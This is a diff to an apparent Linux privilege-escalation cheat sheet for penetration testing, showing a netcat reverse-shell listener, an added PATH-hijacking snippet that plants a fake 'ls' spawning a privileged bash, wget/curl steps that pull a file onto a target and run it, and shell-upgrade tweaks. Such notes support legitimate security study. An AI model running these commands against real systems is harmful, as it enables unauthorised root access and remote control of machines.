@@ -204,6 +204,9 @@ now listen on your side and in less than a minute you have a root reverse shell
 ```
 netcat -nlvp PORT
 ```
+
+[upgrade your shell (optional)](./LinuxPrivEsc.md#upgrade-your-shell)
+
 **Root**
 
 ## Path Hijacking
@@ -217,6 +220,12 @@ echo $PATh
 - Does your current user have write privileges for any of these folders?
 - Can you modify $PATH?
 - Is there a script/application you can start that will be affected by this vulnerability?
+
+```
+echo -e '#!/bin/bash\n/bin/bash -p' > ls
+chmod +x ls
+export PATH=.:$PATH
+```
 
 ## NFS Privilege Escalation
 
@@ -287,11 +296,11 @@ python3 -m http.server 8000
 
 **Then GET the File**
 ```
-wget http://<YOUR_IP>:8000/file_name
+wget http://<TARGET_IP>:8000/file_name
 ```
 OR 
 ```
-curl -O http://<DEINE_IP>:8000/datei_name
+curl -O http://<TARGET_IP>:8000/file_name
 ```
 OR when SSH avaiable
 ```
@@ -302,8 +311,8 @@ scp datei user@<TARGET_IP>:/tmp/
 ```
 chmod +x file
 ```
-
 **RUN IT AND HOPE THAT YOUR MACHINE DONT CRASH**
+
 
 ## Upgrade your shell
 first upgrade your shell
@@ -323,11 +332,13 @@ stty raw -echo; fg
 Now just choose your prefered terminal environment
 ```
 export TERM=xterm
+export TERM=xterm-256color
 ```
 
 clear and `ctrl + c`
 
 **you successfully upgraded and stabilized your shell**
+
 
 ## Get password hashes
 ```
